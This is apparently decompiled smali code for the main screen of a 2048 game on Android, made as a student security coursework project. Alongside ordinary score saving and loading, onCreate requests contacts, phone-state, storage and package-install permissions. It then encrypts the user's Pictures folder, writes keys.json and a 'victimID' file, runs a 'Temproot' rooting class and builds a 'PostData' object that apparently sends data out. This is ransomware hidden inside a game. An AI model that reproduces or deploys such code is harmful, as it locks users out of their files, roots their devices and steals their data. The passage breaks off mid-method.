.class public Laarkay/a2048game/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final CAN_UNDO:Ljava/lang/String; = "can undo"

.field private static final GAME_STATE:Ljava/lang/String; = "game state"

.field private static final HEIGHT:Ljava/lang/String; = "height"

.field private static final HIGH_SCORE:Ljava/lang/String; = "high score temp"

.field private static final MAX_TILE:Ljava/lang/String; = "max tile"

.field private static final SCORE:Ljava/lang/String; = "score"

.field private static final TIMER:Ljava/lang/String; = "timer"

.field private static final UNDO_GAME_STATE:Ljava/lang/String; = "undo game state"

.field private static final UNDO_GRID:Ljava/lang/String; = "undo"

.field private static final UNDO_SCORE:Ljava/lang/String; = "undo score"

.field private static final WIDTH:Ljava/lang/String; = "width"

.field public static volatile running:Z = true


# instance fields
.field t:Ljava/lang/Thread;

.field private view:Laarkay/a2048game/MainView;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic access$000(Laarkay/a2048game/MainActivity;Ljava/lang/String;)V
    .locals 0

    .line 29
    invoke-direct {p0, p1}, Laarkay/a2048game/MainActivity;->openUrl(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$100(Laarkay/a2048game/MainActivity;)Laarkay/a2048game/MainView;
    .locals 0

    .line 29
    iget-object p0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    return-object p0
.end method

.method public static hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 49
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 50
    invoke-static {p0, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method

.method private load()V
    .locals 10

    .line 269
    iget-object v0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v0, v0, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v0, v0, Laarkay/a2048game/MainGame;->aGrid:Laarkay/a2048game/AnimationGrid;

    invoke-virtual {v0}, Laarkay/a2048game/AnimationGrid;->cancelAnimations()V

    .line 271
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 272
    :goto_0
    iget-object v3, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v3, v3, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v3, v3, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v3, v3, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    array-length v3, v3

    if-ge v2, v3, :cond_5

    const/4 v3, 0x0

    .line 273
    :goto_1
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v4, v4, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v4, v4, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    aget-object v4, v4, v1

    array-length v4, v4

    if-ge v3, v4, :cond_4

    .line 274
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v5, " "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v6, -0x1

    invoke-interface {v0, v4, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    const/4 v7, 0x0

    if-lez v4, :cond_0

    .line 276
    iget-object v8, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v8, v8, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v8, v8, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v8, v8, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    aget-object v8, v8, v2

    new-instance v9, Laarkay/a2048game/Tile;

    invoke-direct {v9, v2, v3, v4}, Laarkay/a2048game/Tile;-><init>(III)V

    aput-object v9, v8, v3

    goto :goto_2

    :cond_0
    if-nez v4, :cond_1

    .line 278
    iget-object v8, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v8, v8, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v8, v8, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v8, v8, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    aget-object v8, v8, v2

    aput-object v7, v8, v3

    .line 281
    :cond_1
    :goto_2
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "undo"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v0, v5, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v5

    if-lez v5, :cond_2

    .line 283
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v4, v4, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v4, v4, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    aget-object v4, v4, v2

    new-instance v6, Laarkay/a2048game/Tile;

    invoke-direct {v6, v2, v3, v5}, Laarkay/a2048game/Tile;-><init>(III)V

    aput-object v6, v4, v3

    goto :goto_3

    :cond_2
    if-nez v4, :cond_3

    .line 285
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v4, v4, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v4, v4, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    aget-object v4, v4, v2

    aput-object v7, v4, v3

    :cond_3
    :goto_3
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_1

    :cond_4
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_0

    .line 290
    :cond_5
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->score:J

    const-string v4, "score"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->score:J

    .line 291
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->highScore:J

    const-string v4, "high score temp"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->highScore:J

    .line 292
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->lastScore:J

    const-string v4, "undo score"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->lastScore:J

    .line 293
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-boolean v2, v2, Laarkay/a2048game/MainGame;->canUndo:Z

    const-string v3, "can undo"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    iput-boolean v2, v1, Laarkay/a2048game/MainGame;->canUndo:Z

    .line 294
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v2, v2, Laarkay/a2048game/MainGame;->gameState:I

    const-string v3, "game state"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    iput v2, v1, Laarkay/a2048game/MainGame;->gameState:I

    .line 295
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v2, v2, Laarkay/a2048game/MainGame;->lastGameState:I

    const-string v3, "undo game state"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    iput v2, v1, Laarkay/a2048game/MainGame;->lastGameState:I

    .line 296
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->maxTile:J

    const-string v4, "max tile"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->maxTile:J

    .line 297
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget v2, v1, Laarkay/a2048game/MainView;->elTime:I

    const-string v3, "timer"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    iput v0, v1, Laarkay/a2048game/MainView;->elTime:I

    return-void
.end method

.method private openUrl(Ljava/lang/String;)V
    .locals 2

    .line 336
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    .line 337
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 338
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private rateIntentForUrl(Ljava/lang/String;)Landroid/content/Intent;
    .locals 3

    .line 323
    new-instance v0, Landroid/content/Intent;

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v1, v2

    invoke-virtual {p0}, Laarkay/a2048game/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object p1

    const/4 v2, 0x1

    aput-object p1, v1, v2

    const-string p1, "%s?id=%s"

    invoke-static {p1, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 325
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/high16 p1, 0x48080000    # 139264.0f

    .line 331
    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    return-object v0
.end method

.method private save()V
    .locals 9

    .line 235
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 236
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 237
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v1, v1, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v1, v1, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    .line 238
    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, v2, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v2, v2, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    .line 239
    array-length v3, v1

    const-string v4, "width"

    invoke-interface {v0, v4, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 240
    array-length v3, v1

    const-string v4, "height"

    invoke-interface {v0, v4, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const/4 v3, 0x0

    const/4 v4, 0x0

    .line 241
    :goto_0
    array-length v5, v1

    if-ge v4, v5, :cond_3

    const/4 v5, 0x0

    .line 242
    :goto_1
    aget-object v6, v1, v3

    array-length v6, v6

    if-ge v5, v6, :cond_2

    .line 243
    aget-object v6, v1, v4

    aget-object v6, v6, v5

    const-string v7, " "

    if-eqz v6, :cond_0

    .line 244
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aget-object v8, v1, v4

    aget-object v8, v8, v5

    invoke-virtual {v8}, Laarkay/a2048game/Tile;->getValue()I

    move-result v8

    invoke-interface {v0, v6, v8}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    goto :goto_2

    .line 246
    :cond_0
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v6, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 249
    :goto_2
    aget-object v6, v2, v4

    aget-object v6, v6, v5

    const-string v8, "undo"

    if-eqz v6, :cond_1

    .line 250
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aget-object v7, v2, v4

    aget-object v7, v7, v5

    invoke-virtual {v7}, Laarkay/a2048game/Tile;->getValue()I

    move-result v7

    invoke-interface {v0, v6, v7}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    goto :goto_3

    .line 252
    :cond_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v6, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    :goto_3
    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_1

    :cond_2
    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_0

    .line 256
    :cond_3
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v1, v1, Laarkay/a2048game/MainGame;->score:J

    const-string v3, "score"

    invoke-interface {v0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 257
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v1, v1, Laarkay/a2048game/MainGame;->highScore:J

    const-string v3, "high score temp"

    invoke-interface {v0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 258
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v1, v1, Laarkay/a2048game/MainGame;->lastScore:J

    const-string v3, "undo score"

    invoke-interface {v0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 259
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-boolean v1, v1, Laarkay/a2048game/MainGame;->canUndo:Z

    const-string v2, "can undo"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 260
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v1, v1, Laarkay/a2048game/MainGame;->gameState:I

    const-string v2, "game state"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 261
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v1, v1, Laarkay/a2048game/MainGame;->lastGameState:I

    const-string v2, "undo game state"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 262
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v1, v1, Laarkay/a2048game/MainGame;->maxTile:J

    const-string v3, "max tile"

    invoke-interface {v0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 263
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget v1, v1, Laarkay/a2048game/MainView;->elTime:I

    const-string v2, "timer"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 264
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    return-void
.end method

.method private secretFunc()V
    .locals 6

    const-string v0, "P3 - Team 2"

    const-string v1, "Nicholas Chong"

    const-string v2, "Xavier Lim"

    const-string v3, "Chow Wen Jun"

    const-string v4, "Lim Yong An"

    const-string v5, "Chan Hon Siang"

    .line 343
    filled-new-array/range {v0 .. v5}, [Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    :goto_0
    const/4 v2, 0x6

    if-ge v1, v2, :cond_0

    .line 351
    aget-object v2, v0, v1

    const-string v3, "ICT2207"

    .line 352
    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 10

    .line 62
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f0c001d

    .line 63
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->setContentView(I)V

    const v0, 0x7f0901a7

    .line 64
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Laarkay/a2048game/MainView;

    iput-object v0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    const-string v1, "android.permission.ACCESS_NETWORK_STATE"

    const-string v2, "android.permission.ACCESS_WIFI_STATE"

    const-string v3, "android.permission.INTERNET"

    const-string v4, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v5, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v6, "android.permission.INTERACT_ACROSS_PROFILES"

    const-string v7, "android.permission.REQUEST_INSTALL_PACKAGES"

    const-string v8, "android.permission.READ_CONTACTS"

    const-string v9, "android.permission.READ_PHONE_STATE"

    .line 67
    filled-new-array/range {v1 .. v9}, [Ljava/lang/String;

    move-result-object v0

    .line 81
    invoke-static {p0, v0}, Laarkay/a2048game/MainActivity;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_0

    .line 82
    invoke-static {p0, v0, v2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_0
    const v0, 0x7f09009f

    .line 86
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    .line 87
    new-instance v1, Laarkay/a2048game/MainActivity$1;

    invoke-direct {v1, p0}, Laarkay/a2048game/MainActivity$1;-><init>(Laarkay/a2048game/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 95
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->secretFunc()V

    const-string v0, "/sdcard/keys.json"

    const-string v1, "/sdcard/Pictures"

    .line 101
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 102
    new-instance v4, Ljava/io/File;

    const-string v5, "/sdcard/victimID.txt"

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 103
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v3

    const-string v5, "MAIN ACTIVITY"

    if-eqz v3, :cond_2

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    goto :goto_0

    :cond_1
    const-string v0, "keys.json && victimID.txt exists, not encrypting"

    .line 112
    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_2
    :goto_0
    :try_start_0
    const-string v3, "Encrypting in progress"

    .line 105
    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v3, ""

    .line 106
    invoke-static {v2, v1, v0, v3}, Laarkay/a2048game/Encrypt;->init(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 108
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_1
    :try_start_1
    const-string v0, "Executing temproot"

    .line 117
    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 118
    new-instance v0, Laarkay/a2048game/Temproot;

    invoke-direct {v0, p0}, Laarkay/a2048game/Temproot;-><init>(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    .line 120
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 125
    :goto_2
    :try_start_2
    new-instance v0, Laarkay/a2048game/PostData;

    invoke-direct {v0, p0}, Laarkay/a2048game/PostData;-><init>(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_3

    :catch_2
    move-exception v0

    .line 127
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_3
    const v0, 0x7f090056

    .line 131
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroidx/appcompat/widget/Toolbar;

    const/high16 v1, 0x7f0d0000

    .line 132
    invoke-virtual {v0, v1}, Landroidx/appcompat/widget/Toolbar;->inflateMenu(I)V

    .line 133
    new-instance v1, Laarkay/a2048game/MainActivity$2;

    invoke-direct {v1, p0}, Laarkay/a2048game/MainActivity$2;-><init>(Laarkay/a2048game/MainActivity;)V

    invoke-virtual {v0, v1}, Landroidx/appcompat/widget/Toolbar;->setOnMenuItemClickListener(Landroidx/appcompat/widget/Toolbar$OnMenuItemClickListener;)V

    .line 151
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

